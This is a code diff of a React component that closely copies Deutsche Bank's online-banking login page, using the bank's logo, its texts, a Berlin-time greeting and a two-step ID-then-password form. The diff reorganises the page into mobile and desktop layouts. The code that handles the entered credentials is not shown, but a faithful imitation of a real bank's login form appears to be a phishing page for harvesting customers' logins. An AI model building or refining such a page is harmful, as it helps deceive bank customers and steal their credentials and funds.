@@ -205,6 +205,269 @@ const DeutscheBank = () => {
 
   const ext = { target: "_blank", rel: "noopener noreferrer" } as const;
 
+  const infoBox = (
+    <div
+      className="flex gap-3 px-5 py-8 rounded-sm leading-snug text-[13px] lg:text-[14px]"
+      style={{ backgroundColor: LIGHT, color: "#171945" }}
+    >
+      <div className="pt-0.5 flex-shrink-0">
+        <div style={{ width: 20, height: 20, borderRadius: '50%', backgroundColor: '#206683', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+          <span style={{ color: '#fff', fontSize: 13, fontWeight: 700, fontFamily: 'serif', lineHeight: 1 }}>i</span>
+        </div>
+      </div>
+      <div className="space-y-2">
+        <div className="font-bold text-[14px] lg:text-[15px]">{t.infoTitle}</div>
+        <p>
+          {t.info1a}
+          <a href={URLS.idHelp} {...ext} className="underline">{t.infoHere}</a>
+          {t.info1c}
+        </p>
+        <p>{t.info2}</p>
+        <ul className="list-disc pl-5 space-y-1">
+          <li>{t.bullet1}</li>
+          <li>{t.bullet2}</li>
+        </ul>
+      </div>
+    </div>
+  );
+
+  const loginCard = (
+    <div className="bg-white p-6 lg:p-8 shadow-sm" style={{ minHeight: 340 }}>
+      <div className="mb-6">
+        <img src={logoAsset.url} alt="Deutsche Bank" className="h-6 w-auto" />
+      </div>
+
+      {step === 1 ? (
+        <h1 className="text-[28px] font-semibold mb-5" style={{ color: "#171945", lineHeight: 1.2 }}>
+          {(() => {
+            const h = parseInt(new Intl.DateTimeFormat('de-DE', { timeZone: 'Europe/Berlin', hour: 'numeric', hour12: false }).format(new Date()), 10);
+            return h >= 17 ? t.greetingEvening : t.greeting;
+          })()}
+        </h1>
+      ) : (
+        <div className="mb-2 flex items-center" style={{ height: 34 }}>
+          <button
+            type="button"
+            onClick={() => setStep(1)}
+            className="flex items-center gap-1 text-[13px] font-bold underline"
+            style={{ color: LINK }}
+          >
+            <ArrowLeft size={13} /> {t.back}
+          </button>
+        </div>
+      )}
+      <p className={`text-[15px] mb-5 ${step === 2 ? "mt-6" : ""}`} style={{ color: NAVY }}>
+        {t.enterCreds}
+      </p>
+
+      {step === 1 ? (
+        <>
+          {(() => {
+            const fs = fieldStyle(idFocused, idTouched, dbId.length > 0, idHover);
+            return (
+              <>
+                <label className="block text-[13px] mb-1 pl-[3px]" style={{ color: fs.labelColor }}>
+                  {t.idLabel}
+                </label>
+                <div style={{ padding: "3px" }}>
+                  <input
+                    type="text"
+                    value={dbId}
+                    onChange={(e) => setDbId(e.target.value)}
+                    onFocus={() => setIdFocused(true)}
+                    onBlur={() => { setIdFocused(false); setIdTouched(true); }}
+                    onMouseEnter={() => setIdHover(true)}
+                    onMouseLeave={() => setIdHover(false)}
+                    onKeyDown={(e) => e.key === "Enter" && handleContinue()}
+                    autoFocus
+                    className="w-full px-3 py-3 text-[16px] outline-none"
+                    style={{
+                      border: `1px solid ${fs.borderColor}`,
+                      borderRadius: 2,
+                      boxShadow: fs.boxShadow,
+                      transition: "box-shadow 80ms ease, border-color 80ms ease",
+                    }}
+                  />
+                </div>
+                {fs.isError && (
+                  <div className="flex items-start gap-2 mt-2 text-[13px]" style={{ color: ERR }}>
+                    <span
+                      className="inline-flex items-center justify-center shrink-0 mt-0.5"
+                      style={{
+                        width: 16, height: 16, borderRadius: "50%",
+                        background: ERR, color: "#fff",
+                        fontSize: 11, fontWeight: 700, fontFamily: "serif",
+                        lineHeight: 1,
+                      }}
+                    >i</span>
+                    <span>{t.idError}</span>
+                  </div>
+                )}
+              </>
+            );
+          })()}
+
+          <div className="flex flex-col lg:flex-row-reverse lg:items-center lg:justify-between gap-3 mt-28">
+            <button
+              type="button"
+              onClick={handleContinue}
+              className="db-primary-btn w-full lg:w-auto px-8 py-3.5 text-white font-semibold text-[15px]"
+              style={{ cursor: "pointer" }}
+            >
+              {t.continue}
+            </button>
+            <a href="#" className="text-[13px] font-bold underline text-left" style={{ color: LINK }}>
+              {t.forgot}
+            </a>
+          </div>
+        </>
+      ) : (
+        <>
+          {(() => {
+            const fs = fieldStyle(pwFocused, pwTouched, password.length > 0, pwHover);
+            return (
+              <>
+                <label className="block text-[13px] mb-1 pl-[3px]" style={{ color: fs.labelColor }}>
+                  {t.pwLabel}
+                </label>
+                <div style={{ padding: "3px" }}>
+                  <div
+                    className="relative"
+                    onMouseEnter={() => setPwHover(true)}
+                    onMouseLeave={() => setPwHover(false)}
+                  >
+                    <input
+                      type={showPassword ? "text" : "password"}
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      onFocus={() => setPwFocused(true)}
+                      onBlur={() => { setPwFocused(false); setPwTouched(true); }}
+                      onKeyDown={(e) => e.key === "Enter" && handleLogin()}
+                      autoFocus
+                      className="w-full px-3 py-3 pr-12 text-[16px] outline-none"
+                      style={{
+                        border: `1px solid ${fs.borderColor}`,
+                        borderRadius: 2,
+                        boxShadow: fs.boxShadow,
+                        transition: "box-shadow 80ms ease, border-color 80ms ease",
+                      }}
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowPassword(!showPassword)}
+                      className="absolute right-3 top-1/2 -translate-y-1/2"
+                      style={{ color: BLUE }}
+                      aria-label="Passwort anzeigen"
+                    >
+                      {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
+                    </button>
+                  </div>
+                </div>
+              </>
+            );
+          })()}
+
+          <div className="flex flex-col lg:flex-row-reverse lg:items-center lg:justify-between gap-3 mt-28">
+            <button
+              type="button"
+              onClick={handleLogin}
+              disabled={password.length === 0}
+              className={password.length === 0 ? "w-full lg:w-auto px-8 py-3.5 text-white font-semibold text-[15px]" : "db-primary-btn w-full lg:w-auto px-8 py-3.5 text-white font-semibold text-[15px]"}
+              style={{
+                cursor: password.length === 0 ? "not-allowed" : "pointer",
+                backgroundColor: password.length === 0 ? "#b5b5b5" : undefined,
+              }}
+            >
+              {t.login}
+            </button>
+            <a href="#" className="text-[13px] font-bold underline text-left" style={{ color: LINK }}>
+              {t.forgot}
+            </a>
+          </div>
+        </>
+      )}
+    </div>
+  );
+
+  const rightPanel = (
+    <div className="db-right-panel bg-white shadow-sm">
+      <a href={URLS.teaser} {...ext} className="block px-7 pt-7 pb-6">
+        <img
+          src={teaserAsset.url}
+          alt="3,0% p.a. FestzinsSparen"
+          className="w-full h-auto mb-3"
+        />
+        <div>
+          <div className="text-[16px] font-semibold leading-snug" style={{ color: "#111" }}>
+            {t.teaserTitle}
+          </div>
+          <div className="text-[14px] mt-2" style={{ color: "#333" }}>
+            {t.teaserText}
+          </div>
+          <div className="mt-3 text-[13px] underline font-bold" style={{ color: LINK }}>
+            {t.learnMore}
+          </div>
+        </div>
+      </a>
+
+      <div className="border-t border-gray-200" />
+
+      <InfoBlock
+        icon={<AlertTriangle size={20} color="#171945" />}
+        title={t.secInfoTitle}
+        text={t.secInfoText}
+        links={[
+          { label: t.secNews, href: URLS.secNews },
+          { label: t.secOverview, href: URLS.secOverview },
+        ]}
+      />
+      <InfoBlock
+        icon={<Monitor size={20} color="#171945" />}
+        title={t.accessTitle}
+        text={t.accessText}
+        links={[{ label: t.requestAccess, href: URLS.requestAccess }]}
+      />
+      <InfoBlock
+        icon={<Lock size={20} color="#171945" />}
+        title={t.procTitle}
+        text={t.procText}
+        links={[{ label: t.procedures, href: URLS.secProcedures }]}
+      />
+
+      <div className="px-7 py-7 text-[13px]" style={{ backgroundColor: "#1e2a78", color: "#fff" }}>
+        <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-bold text-[13px]">
+          <button
+            type="button"
+            onClick={() => setLang(lang === "de" ? "en" : "de")}
+            className="hover:underline text-left"
+            style={{ color: "#fff", background: "none", padding: 0 }}
+          >
+            {t.langToggle}
+          </button>
+          <a href={URLS.help} {...ext} className="hover:underline">{t.help}</a>
+          <a href={URLS.demo} {...ext} className="hover:underline">{t.demo}</a>
+        </div>
+        <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-bold text-[13px]">
+          <a href={URLS.imprint} {...ext} className="hover:underline">{t.imprint}</a>
+          <a href={URLS.legal} {...ext} className="hover:underline">{t.legal}</a>
+          <a href={URLS.privacy} {...ext} className="hover:underline">{t.privacy}</a>
+        </div>
+        <div className="flex flex-wrap gap-x-5 gap-y-1 mb-4 font-bold text-[13px]">
+          <a href={URLS.cookies} className="hover:underline">{t.cookies}</a>
+        </div>
+        <a
+          href={URLS.revoke}
+          {...ext}
+          className="block lg:inline-block w-full lg:w-auto text-center lg:text-left text-[13px] font-semibold px-4 py-2 mb-3 text-white no-underline"
+          style={{ backgroundColor: "#0550d1" }}
+        >
+          {t.revoke}
+        </a>
+        <div className="text-[12px]">{t.copyright}</div>
+      </div>
+    </div>
+  );
+
   return (
     <>
       <style>{`
@@ -212,7 +475,14 @@ const DeutscheBank = () => {
         .db-font a { letter-spacing: 0.2px; }
         .db-primary-btn { background:#0550d1; transition: background 120ms ease; }
         .db-primary-btn:hover { background:#0445b0; }
+        .db-hero-bg { background-color: #1e2a78; }
         @media (min-width: 1024px) {
+          .db-hero-bg {
+            background-image: url(${bgAsset.url});
+            background-size: cover;
+            background-position: center;
+            background-color: #0018a8;
+          }
           .db-right-panel {
             position: fixed; top: 0; bottom: 0;
             left: max(788px, calc(50% + 188px));
@@ -229,278 +499,25 @@ const DeutscheBank = () => {
         />
       )}
       <div className="min-h-screen flex flex-col db-font" style={{ color: "#1a1a1a" }}>
-        <div
-          className="relative flex-1"
-          style={{
-            backgroundImage: `url(${bgAsset.url})`,
-            backgroundSize: "cover",
-            backgroundPosition: "center",
-            backgroundColor: BLUE,
-          }}
-        >
-          <div className="max-w-[1200px] mx-auto px-4 py-8 lg:py-16 grid lg:grid-cols-[minmax(0,560px)_minmax(0,396px)] gap-[256px]">
-            {/* LEFT COLUMN */}
+        {/* MOBILE LAYOUT */}
+        <div className="lg:hidden">
+          <div className="db-hero-bg px-4 pt-6 pb-4 space-y-4">
+            {infoBox}
+            {loginCard}
+          </div>
+          <div className="bg-white">
+            {rightPanel}
+          </div>
+        </div>
+
+        {/* DESKTOP LAYOUT */}
+        <div className="hidden lg:block relative flex-1 db-hero-bg">
+          <div className="max-w-[1200px] mx-auto px-4 py-16 grid grid-cols-[minmax(0,560px)_minmax(0,396px)] gap-[256px]">
             <div className="space-y-6">
-              {/* Info box */}
-              <div
-                className="flex gap-3 px-5 py-8 rounded-sm text-[14px] leading-snug"
-                style={{ backgroundColor: LIGHT, color: "#171945" }}
-              >
-                <div className="pt-0.5 flex-shrink-0">
-                  <div style={{ width: 20, height: 20, borderRadius: '50%', backgroundColor: '#206683', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                    <span style={{ color: '#fff', fontSize: 13, fontWeight: 700, fontFamily: 'serif', lineHeight: 1 }}>i</span>
-                  </div>
-                </div>
-                <div className="space-y-2">
-                  <div className="text-[15px] font-bold">{t.infoTitle}</div>
-                  <p>
-                    {t.info1a}
-                    <a href={URLS.idHelp} {...ext} className="underline">{t.infoHere}</a>
-                    {t.info1c}
-                  </p>
-                  <p>{t.info2}</p>
-                  <ul className="list-disc pl-5 space-y-1">
-                    <li>{t.bullet1}</li>
-                    <li>{t.bullet2}</li>
-                  </ul>
-                </div>
-              </div>
-
-              {/* Login card */}
-              <div className="bg-white p-6 lg:p-8 shadow-sm" style={{ minHeight: 340 }}>
-                <div className="mb-6">
-                  <img src={logoAsset.url} alt="Deutsche Bank" className="h-6 w-auto" />
-                </div>
-
-                {step === 1 ? (
-                  <h1 className="text-[28px] font-semibold mb-5" style={{ color: "#171945", lineHeight: 1.2 }}>
-                    {(() => {
-                      const h = parseInt(new Intl.DateTimeFormat('de-DE', { timeZone: 'Europe/Berlin', hour: 'numeric', hour12: false }).format(new Date()), 10);
-                      return h >= 17 ? t.greetingEvening : t.greeting;
-                    })()}
-                  </h1>
-                ) : (
-                  <div className="mb-2 flex items-center" style={{ height: 34 }}>
-                    <button
-                      type="button"
-                      onClick={() => setStep(1)}
-                      className="flex items-center gap-1 text-[13px] font-bold underline"
-                      style={{ color: LINK }}
-                    >
-                      <ArrowLeft size={13} /> {t.back}
-                    </button>
-                  </div>
-                )}
-                <p className={`text-[15px] mb-5 ${step === 2 ? "mt-6" : ""}`} style={{ color: NAVY }}>
-                  {t.enterCreds}
-                </p>
-
-                {step === 1 ? (
-                  <>
-                    {(() => {
-                      const fs = fieldStyle(idFocused, idTouched, dbId.length > 0, idHover);
-                      return (
-                        <>
-                          <label className="block text-[13px] mb-1 pl-[3px]" style={{ color: fs.labelColor }}>
-                            {t.idLabel}
-                          </label>
-                          <div style={{ padding: "3px" }}>
-                            <input
-                              type="text"
-                              value={dbId}
-                              onChange={(e) => setDbId(e.target.value)}
-                              onFocus={() => setIdFocused(true)}
-                              onBlur={() => { setIdFocused(false); setIdTouched(true); }}
-                              onMouseEnter={() => setIdHover(true)}
-                              onMouseLeave={() => setIdHover(false)}
-                              onKeyDown={(e) => e.key === "Enter" && handleContinue()}
-                              autoFocus
-                              className="w-full px-3 py-3 text-[16px] outline-none"
-                              style={{
-                                border: `1px solid ${fs.borderColor}`,
-                                borderRadius: 2,
-                                boxShadow: fs.boxShadow,
-                                transition: "box-shadow 80ms ease, border-color 80ms ease",
-                              }}
-                            />
-                          </div>
-                          {fs.isError && (
-                            <div className="flex items-start gap-2 mt-2 text-[13px]" style={{ color: ERR }}>
-                              <span
-                                className="inline-flex items-center justify-center shrink-0 mt-0.5"
-                                style={{
-                                  width: 16, height: 16, borderRadius: "50%",
-                                  background: ERR, color: "#fff",
-                                  fontSize: 11, fontWeight: 700, fontFamily: "serif",
-                                  lineHeight: 1,
-                                }}
-                              >i</span>
-                              <span>{t.idError}</span>
-                            </div>
-                          )}
-                        </>
-                      );
-                    })()}
-
-                    <div className="flex items-center justify-between mt-28">
-                      <a href="#" className="text-[13px] font-bold underline" style={{ color: LINK }}>
-                        {t.forgot}
-                      </a>
-                      <button
-                        type="button"
-                        onClick={handleContinue}
-                        className="db-primary-btn px-8 py-3.5 text-white font-semibold text-[15px]"
-                        style={{ cursor: "pointer" }}
-                      >
-                        {t.continue}
-                      </button>
-                    </div>
-                  </>
-                ) : (
-                  <>
-                    {(() => {
-                      const fs = fieldStyle(pwFocused, pwTouched, password.length > 0, pwHover);
-                      return (
-                        <>
-                          <label className="block text-[13px] mb-1 pl-[3px]" style={{ color: fs.labelColor }}>
-                            {t.pwLabel}
-                          </label>
-                          <div style={{ padding: "3px" }}>
-                            <div
-                              className="relative"
-                              onMouseEnter={() => setPwHover(true)}
-                              onMouseLeave={() => setPwHover(false)}
-                            >
-                              <input
-                                type={showPassword ? "text" : "password"}
-                                value={password}
-                                onChange={(e) => setPassword(e.target.value)}
-                                onFocus={() => setPwFocused(true)}
-                                onBlur={() => { setPwFocused(false); setPwTouched(true); }}
-                                onKeyDown={(e) => e.key === "Enter" && handleLogin()}
-                                autoFocus
-                                className="w-full px-3 py-3 pr-12 text-[16px] outline-none"
-                                style={{
-                                  border: `1px solid ${fs.borderColor}`,
-                                  borderRadius: 2,
-                                  boxShadow: fs.boxShadow,
-                                  transition: "box-shadow 80ms ease, border-color 80ms ease",
-                                }}
-                              />
-                              <button
-                                type="button"
-                                onClick={() => setShowPassword(!showPassword)}
-                                className="absolute right-3 top-1/2 -translate-y-1/2"
-                                style={{ color: BLUE }}
-                                aria-label="Passwort anzeigen"
-                              >
-                                {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
-                              </button>
-                            </div>
-                          </div>
-                        </>
-                      );
-                    })()}
-
-                    <div className="flex items-center justify-between mt-28">
-                      <a href="#" className="text-[13px] font-bold underline" style={{ color: LINK }}>
-                        {t.forgot}
-                      </a>
-                      <button
-                        type="button"
-                        onClick={handleLogin}
-                        disabled={password.length === 0}
-                        className={password.length === 0 ? "px-8 py-3.5 text-white font-semibold text-[15px]" : "db-primary-btn px-8 py-3.5 text-white font-semibold text-[15px]"}
-                        style={{
-                          cursor: password.length === 0 ? "not-allowed" : "pointer",
-                          backgroundColor: password.length === 0 ? "#b5b5b5" : undefined,
-                        }}
-                      >
-                        {t.login}
-                      </button>
-                    </div>
-                  </>
-                )}
-              </div>
+              {infoBox}
+              {loginCard}
             </div>
-
-            {/* RIGHT COLUMN */}
-            <div className="db-right-panel bg-white shadow-sm">
-              <a href={URLS.teaser} {...ext} className="block px-7 pt-7 pb-6">
-                <img
-                  src={teaserAsset.url}
-                  alt="3,0% p.a. FestzinsSparen"
-                  className="w-full h-auto mb-3"
-                />
-                <div>
-                  <div className="text-[16px] font-semibold leading-snug" style={{ color: "#111" }}>
-                    {t.teaserTitle}
-                  </div>
-                  <div className="text-[14px] mt-2" style={{ color: "#333" }}>
-                    {t.teaserText}
-                  </div>
-                  <div className="mt-3 text-[13px] underline font-bold" style={{ color: LINK }}>
-                    {t.learnMore}
-                  </div>
-                </div>
-              </a>
-
-              <div className="border-t border-gray-200" />
-
-              <InfoBlock
-                icon={<AlertTriangle size={20} color="#171945" />}
-                title={t.secInfoTitle}
-                text={t.secInfoText}
-                links={[
-                  { label: t.secNews, href: URLS.secNews },
-                  { label: t.secOverview, href: URLS.secOverview },
-                ]}
-              />
-              <InfoBlock
-                icon={<Monitor size={20} color="#171945" />}
-                title={t.accessTitle}
-                text={t.accessText}
-                links={[{ label: t.requestAccess, href: URLS.requestAccess }]}
-              />
-              <InfoBlock
-                icon={<Lock size={20} color="#171945" />}
-                title={t.procTitle}
-                text={t.procText}
-                links={[{ label: t.procedures, href: URLS.secProcedures }]}
-              />
-
-              <div className="px-7 py-7 text-[13px]" style={{ backgroundColor: "#1e2a78", color: "#fff" }}>
-                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-bold text-[13px]">
-                  <button
-                    type="button"
-                    onClick={() => setLang(lang === "de" ? "en" : "de")}
-                    className="hover:underline text-left"
-                    style={{ color: "#fff", background: "none", padding: 0 }}
-                  >
-                    {t.langToggle}
-                  </button>
-                  <a href={URLS.help} {...ext} className="hover:underline">{t.help}</a>
-                  <a href={URLS.demo} {...ext} className="hover:underline">{t.demo}</a>
-                </div>
-                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-2 font-bold text-[13px]">
-                  <a href={URLS.imprint} {...ext} className="hover:underline">{t.imprint}</a>
-                  <a href={URLS.legal} {...ext} className="hover:underline">{t.legal}</a>
-                  <a href={URLS.privacy} {...ext} className="hover:underline">{t.privacy}</a>
-                </div>
-                <div className="flex flex-wrap gap-x-5 gap-y-1 mb-4 font-bold text-[13px]">
-                  <a href={URLS.cookies} className="hover:underline">{t.cookies}</a>
-                </div>
-                <a
-                  href={URLS.revoke}
-                  {...ext}
-                  className="inline-block text-[13px] font-semibold px-4 py-2 mb-3 text-white no-underline"
-                  style={{ backgroundColor: "#0550d1" }}
-                >
-                  {t.revoke}
-                </a>
-                <div className="text-[12px]">{t.copyright}</div>
-              </div>
-            </div>
+            {rightPanel}
           </div>
         </div>
       </div>
